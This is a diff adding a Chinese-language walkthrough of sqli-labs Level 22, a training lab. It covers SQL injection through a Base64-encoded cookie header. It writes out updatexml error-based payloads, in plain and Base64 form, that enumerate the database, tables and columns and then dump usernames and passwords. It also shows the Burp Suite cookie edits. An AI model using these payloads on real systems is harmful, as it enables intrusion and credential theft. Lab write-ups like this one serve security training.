@@ -2879,3 +2879,151 @@ admin1')and updatexml  (1,concat(0x5c,(select group_concat(username,password) fr
 成功爆破数据
 
 ![Less-21_19](./img/Less-21_19.PNG)
+
+
+
+### Level-22 Cookie头注入 + Base64编码
+
++ 首先打开<code>phpstudy</code>和<code>burpsuite</code>并配置好相应的设置，打开<code>sqli-labs</code>靶场到第22关
+
+![Less-22_1](./img/Less-22_1.PNG)
+
+
+
++ 输入账号<code>admin</code>和密码<code>admin</code>，发现返回的<code>response</code>中的<code>Cookie</code>是<code>base64</code>编码
+
+![Less-22_2](./img/Less-22_2.PNG)
+
+![Less-22_4](./img/Less-22_4.PNG)
+
+![Less-22_6](./img/Less-22_6.PNG)
+
+![Less-22_5](./img/Less-22_5.PNG)
+
+由此，22关与第21关基本一样，不一样的是第22关用双引号<code>"</code>闭合而第21关用单引号<code>'</code>闭合且第22关没有单括号
+
+
+
++ 爆库名
+
+~~~ shell
+admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1) and "1"="1
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAiMSI9IjE=
+~~~
+
+
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+![Less-22_7](./img/Less-22_7.PNG)
+
+
+
+成功爆出数据库名<code>security</code>
+
+![Less-22_8](./img/Less-22_8.PNG)
+
+
+
++ 爆数据表名
+
+~~~ shell
+" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
+~~~
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+将
+
+~~~ shell
+Cookie: uname=YWRtaW4%3D
+~~~
+
+![Less-22_10](./img/Less-22_10.PNG)
+
+改为
+
+~~~ shell
+Cookie: uname=YWRtaW4x
+~~~
+
+![Less-22_11](./img/Less-22_11.PNG)
+
+再添加
+
+~~~ shell
+IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
+~~~
+
+拼接为
+
+~~~ shell
+Cookie: uname=YWRtaW4xIiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
+~~~
+
+![Less-22_13](./img/Less-22_13.PNG)
+
+
+
+放包后，顺利爆破出相应的数据表
+
+![Less-22_14](./img/Less-22_14.PNG)
+
+
+
++ 爆数据列名
+
+~~~ shell
+admin1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
+~~~
+
+<code>base64</code>编码后
+
+~~~ shell
+YWRtaW4xIiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkgYW5kIHRhYmxlX25hbWU9J3VzZXJzJyksMHg3ZSksMSkj
+~~~
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+![Less-22_15](./img/Less-22_15.PNG)
+
+
+
+最终成功爆破出数据列名 
+
+![Less-22_16](./img/Less-22_16.PNG)
+
+
+
++ 爆破账号和密码
+
+~~~ shell
+admin1" and updatexml  (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#
+~~~
+
+经过<code>base64</code>编码后
+
+~~~ shell
+YWRtaW4xIiBhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSkj
+~~~
+
+打开<code>burpsuite</code>拦截并注入到<code>cookie</code>头中经过<code>base64</code>编码的数据
+
+![Less-22_17](./img/Less-22_17.PNG)
+
+
+
+最终爆破出数据
+
+![Less-22_18](./img/Less-22_18.PNG)
